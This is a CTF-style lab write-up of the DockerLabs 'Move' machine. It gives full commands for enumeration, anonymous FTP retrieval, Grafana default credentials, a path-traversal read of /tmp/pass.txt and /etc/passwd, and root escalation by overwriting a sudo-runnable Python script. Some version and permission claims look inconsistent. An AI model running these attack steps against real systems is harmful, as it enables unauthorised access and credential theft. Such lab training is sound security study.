# Move - DockerLabs - Easy

## Summary

**Move** is an easy Linux machine from DockerLabs. The attack path involves anonymous FTP enumeration to find a KeePass database, a Grafana LFI (CVE-2021-43798) to read `/tmp/pass.txt` and `/etc/passwd`, SSH access as `freddy`, and privilege escalation by overwriting a Python script executable as root via NOPASSWD sudo.

---

## Tools

- `nmap` — port and service enumeration
- `gobuster` — web directory enumeration
- `ftp` — anonymous FTP access
- `curl` — Grafana LFI exploitation
- `ssh` — remote access

---

## 1. Enumeration

### Port Scan

```bash
nmap -sC -sV -p- 172.17.0.2
```

Open ports:
- **21** — FTP (vsftpd 3.0.3) — anonymous login allowed, writable directory `mantenimiento`
- **22** — SSH (OpenSSH 9.6p1)
- **80** — HTTP (Apache 2.4.58) — maintenance page: `"access is in /tmp/pass.txt"`
- **3000** — Grafana HTTP

### Web Enumeration

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 20
```

Finding: `/maintenance.html` — page says credentials are stored at `/tmp/pass.txt` on the server.

### FTP Enumeration

```bash
ftp 172.17.0.2
# Name: anonymous
# Password: (empty)
ftp> cd mantenimiento
ftp> ls
# -rwxrwxrwx database.kdbx
ftp> get database.kdbx
```

A KeePass 4.x database was found. Cracking attempts failed:
- `keepass2john` — unsupported file version `40000`
- `hashcat -m 13400` — requires extracted hash, not raw file
- KeePassXC GUI — wrong credentials, HMAC mismatch

> **Lesson:** KeePass 4.x is not supported by standard cracking tools. Pivot to other attack vectors.

### Grafana

Browsing to `http://172.17.0.2:3000` reveals Grafana. Default credentials work:

```
admin : admin
```

Grafana version: **13.3** (too recent for most known CVEs, but the path traversal still works).

## 2. Exploitation

### Grafana LFI (CVE-2021-43798 style)

Despite running version 13.3, the path traversal via plugin directory is still exploitable:

```bash
# Read /tmp/pass.txt
curl -s --path-as-is "http://admin:admin@172.17.0.2:3000/public/plugins/alertlist/../../../../../../../../../../../tmp/pass.txt"
# Output: t9sH76gpQ82UFeZ3GXZS

# Read /etc/passwd to find valid users
curl -s --path-as-is "http://admin:admin@172.17.0.2:3000/public/plugins/alertlist/../../../../../../../../../../../etc/passwd"
```

Users with `/bin/bash`:
- `root`
- `freddy`

### SSH Access

```bash
ssh freddy@172.17.0.2
# password: t9sH76gpQ82UFeZ3GXZS
```

## 3. Escalate Privileges

### sudo -l

```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/python3 /opt/maintenance.py
```

### Check file permissions

```bash
ls -la /opt/maintenance.py
# -rw-r--r-- 1 freddy freddy 35 Mar 29 2024 /opt/maintenance.py
```

`freddy` owns the file — can overwrite it directly.

### Overwrite and execute

```bash
echo 'import os; os.system("/bin/bash")' > /opt/maintenance.py
sudo /usr/bin/python3 /opt/maintenance.py
whoami
# root
```

---

## 4. Lessons Learned

1. **Always check all open ports** — Grafana on port 3000 was the main attack vector, not the web server on 80.
2. **Default credentials are still common** — `admin:admin` on Grafana gave full access.
3. **Path traversal can persist across versions** — CVE-2021-43798 was originally for Grafana < 8.3.0, but the same technique worked on version 13.3.
4. **KeePass 4.x cannot be cracked with standard tools** — `keepass2john` and `hashcat` don't support version 4. Pivot instead of getting stuck.
5. **Check who owns a sudo script, not just who can run it** — the script was owned by `freddy`, making overwrite trivial even without write permissions via group.
6. **FTP anonymous + writable directory doesn't always mean you can write** — vsftpd can restrict writes despite directory permissions showing `rwxrwxrwx`; verify with `put` before assuming access.
